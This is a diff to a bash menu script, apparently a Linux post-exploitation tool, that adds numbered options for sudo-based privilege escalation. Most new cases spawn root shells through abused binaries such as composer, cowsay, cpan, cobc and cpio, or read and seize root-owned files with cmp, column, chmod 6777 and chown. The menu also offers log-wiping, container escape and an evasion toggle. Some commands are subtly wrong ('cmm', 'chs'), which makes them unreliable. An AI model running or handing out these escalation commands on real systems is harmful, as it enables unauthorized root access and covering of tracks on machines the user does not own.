@@ -71,14 +71,6 @@ function Scarica
 echo "linuxallenum, by FabioDefilippoSoftware"
 
 while true; do
-	if [[ "$HGSC" == "1" ]];
-	then
-		HGSC="Evasion/Bypass=Enabled"
-	else
-		HGSC="Evasion/Bypass=Disabled"
-	fi
-	echo -ne "\n""$HGSC""\n\n"
-	echo -ne "0. exit\t\t\t\t\t\t\t218. Set an higher level of evasion/bypassing piping scripts\n"
 	echo "ACTIVE DIRECTORY"
 	echo -ne " 20. skelsec/jackdaw\t\t\t\t\t139. DanMcInerney/icebreaker\n"
 	echo "ANTIFORENSICS - STEGANOGRAPHY"
@@ -169,7 +161,7 @@ while true; do
 	echo -ne " 27. PrivEsc with git\t\t\t\t\t28. PrivEsc with apt\t\t\t\t29. PrivEsc with cat\n"
 	echo -ne " 142. clear IP from logs\t\t\t\t143. SOCAT Port Forward\t\t\t\t144. sudo -l\n"
 	echo -ne " 145. ElasticSearch dumping\t\t\t\t146. view lastlog\t\t\t\t147. view auth_log\n"
-	echo -ne " 148. view history\t\t\t\t\t161. Privesc with chroot\t\t\t225. Fix limited PATH env\n"
+	echo -ne " 148. view history\t\t\t\t\t161. Privesc with chroot method 1\t\t225. Fix limited PATH env\n"
 	echo -ne " 168. search keywords inside files in specific folder\t\t\t\t\t\t\t169. dump keys from memcached\n"
 	echo -ne " 171. escape from Docker method 1\t\t\t174. extract a tar.gz file\t\t\t229. insert current path in PATH var\n"
 	echo -ne " 177. use Kubernetes exploit for Local Command Execution\t\t\t\t\t\t178. analyze an executable file with strace and ltrace\n"
@@ -192,11 +184,24 @@ while true; do
 	echo -ne " 255. PrivEsc with certbot\t\t\t\t256. PrivEsc with check_by_ssh\t\t\t257. Read a root's file with check_cups\n"
 	echo -ne " 258. PrivEsc with check_log\t\t\t\t259. Read a root's file with check_memory\t260. Read a root's file with check_raid\n"
 	echo -ne " 261. PrivEsc with check_ssl_cert\t\t\t242. PrivEsc with at\n"
-	
+	echo -ne " 262. Read a root's file with check_statusfile\t\t263. Set readable a root's file\t\t\t264. Set readable a root's file\n"
+	echo -ne " 265. PrivEsc with chroot method 2\t\t\t266. Read a root's file with cmp\t\t267. PrivEsc with cobc\n"
+	echo -ne " 268. Read a root's file with column\t\t\t269. Read a root's file with comm\t\t270. PrivEsc with composer\n"
+	echo -ne " 271. PrivEsc with cowsay\t\t\t\t272. PrivEsc with cowthink\t\t\t273. PrivEsc with cp\n"
+	echo -ne " 274. PrivEsc with cpan\t\t\t\t\t275. PrivEsc with cpio\t\t\t\t276. PrivEsc with cpulimit\n"
+	echo -ne " 277. PrivEsc with crash\t\t\t\t278. PrivEsc with crontab\t\t\t279. PrivEsc with csh\n"
 	echo "WINRM"
 	echo -ne " 132. Alamot/code-snippets/winrm/\n"
 	echo "OTHERS"
 	echo -ne " 112. corelan/mona\t\t\t\t\t113. utkusen/shotlooter\t\t\t\t135. trustedsec/tscopy\n"
+	if [[ "$HGSC" == "1" ]];
+	then
+	HGSC="Evasion/Bypass=Enabled"
+	else
+		HGSC="Evasion/Bypass=Disabled"
+	fi
+	echo -ne "\n""$HGSC""\n"
+	echo -ne "0. exit\t\t\t\t\t\t\t218. Set an higher level of evasion/bypassing piping scripts\n\n"
 
 	read -p "Choose a script: " SCELTA
 	case "$SCELTA" in
@@ -1447,10 +1452,12 @@ while true; do
 		fi
 	;;
 	"248")
+		echo "!/bin/sh"
 		sudo bundler help
 		!/bin/sh
 	;;
 	"249")
+		echo "!/bin/sh"
 		sudo busctl --show-machine
 		!/bin/sh
 	;;
@@ -1530,6 +1537,103 @@ while true; do
 			check_ssl_cert --curl-bin $TF -H example.net
 			cat $OUTPUT
 		fi
+	;;
+	"262")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo check_statusfile $LFILE
+		fi
+	;;
+	"263")
+		echo "Digit a root's file to set readable"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo chmod 6777 $LFILE
+		fi
+	;;
+	"264")
+		echo "Digit a root's file to set readable"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo chown $(id -un):$(id -gn) $LFILE
+		fi
+	;;
+	"265")
+		sudo chroot /
+	;;
+	"266")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo cmp $LFILE /dev/zero -b -l
+		fi
+	;;
+	"267")
+		TF=$(mktemp -d)
+		echo 'CALL "SYSTEM" USING "/bin/sh".' > $TF/x
+		sudo cobc -xFj --frelax-syntax-checks $TF/x
+	;;
+	"268")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo column $LFILE
+		fi
+	;;
+	"269")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo cmm $LFILE /dev/null 2>/dev/null
+		fi
+	;;
+	"270")
+		TF=$(mktemp -d)
+		echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
+		sudo composer --working-dir=$TF run-script x
+	;;
+	"271")
+		TF=$(mktemp)
+		echo 'exec "/bin/sh";' >$TF
+		sudo cowsay -f $TF x
+	;;
+	"272")
+		TF=$(mktemp)
+		echo 'exec "/bin/sh";' >$TF
+		sudo cowthink -f $TF x
+	;;
+	"273")
+		sudo cp /bin/sh /bin/cp && sudo cp
+	;;
+	"274")
+		echo "! exec '/bin/bash'"
+		sudo cpan
+		! exec '/bin/bash'
+	;;
+	"275")
+		echo '/bin/sh </dev/tty >/dev/tty' >localhost
+		sudo cpio -o --rsh-command /bin/sh -F localhost:
+	;;
+	"276")
+		sudo cpulimit -l 100 -f /bin/sh
+	;;
+	"277")
+		echo "!sh"
+		sudo crash -h
+		!sh
+	;;
+	"278")
+		sudo crontab -e
+	;;
+	"279")
+		sudo chs
 	;;
 	*)
 		echo "error, invalid choice"
